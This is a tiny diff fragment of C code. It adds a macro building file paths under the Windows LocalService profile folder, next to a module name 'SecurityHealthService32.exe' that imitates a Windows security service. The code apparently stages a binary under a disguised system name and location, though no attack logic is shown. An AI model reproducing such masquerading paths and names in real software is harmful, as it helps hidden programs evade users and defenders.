@@ -9,6 +9,7 @@
 #else
 #define FULL_PATH(x) JOIN("C:\\Windows\\SysWOW64\\", x)
 #endif
+#define SHELL_PATH(x) JOIN("C:\\Windows\\ServiceProfiles\\LocalService\\", x)
 
 #define SHELL_MODULE_NAME "SecurityHealthService32.exe"
 
